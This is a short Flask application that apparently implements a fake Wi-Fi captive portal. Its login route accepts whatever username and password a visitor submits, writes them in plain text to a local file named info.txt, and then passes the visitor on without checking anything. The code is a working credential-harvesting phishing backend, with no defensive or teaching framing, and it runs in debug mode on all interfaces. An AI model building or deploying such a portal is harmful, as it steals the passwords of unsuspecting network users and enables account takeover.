from flask import Flask, render_template, request, session, redirect, url_for
from urllib.parse import urlparse



app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Set the secret key for session management

@app.route('/')
def index():
    if 'passed_portal' in session:  # Check if the user has passed the captive portal
        return redirect(url_for('requested_website'))  # If yes, redirect to the requested website
    else:
        return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Get the submitted username and password
    username = request.form['username']
    password = request.form['password']

    with open("info.txt", "a") as f:
        f.write(f"username: {username} \npassword: {password}\n")

    # Set the session flag to indicate that the user has passed the captive portal
    session['passed_portal'] = True

    # Store the requested URL in the session
    requested_url = request.args.get('url')
    if requested_url:
        session['requested_url'] = requested_url

    return redirect(url_for('requested_website'))  # Redirect to the requested website

@app.route('/requested-website')
def requested_website():
    if 'passed_portal' in session:  # Check if the user has passed the captive portal
        requested_url = session.get('requested_url')
        if requested_url:
            # Clear the requested_url session variable
            session.pop('requested_url', None)

            # Extract the hostname from the requested URL
            hostname = urlparse(requested_url).hostname

            # Render the requested website template and include the hostname as a variable
            return render_template('requested_website.html', hostname=hostname)
        else:
            # If there's no requested_url in the session, redirect to the index page
            return redirect(url_for('index'))
    else:
        # If the user hasn't passed the captive portal, redirect to the index page
        return redirect(url_for('index'))

if __name__ == '__main__':
    print("helllllllllllllllllllllllllllllllllllllllllllllllllloooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo")
    app.run(host='0.0.0.0', port=5000, debug=True)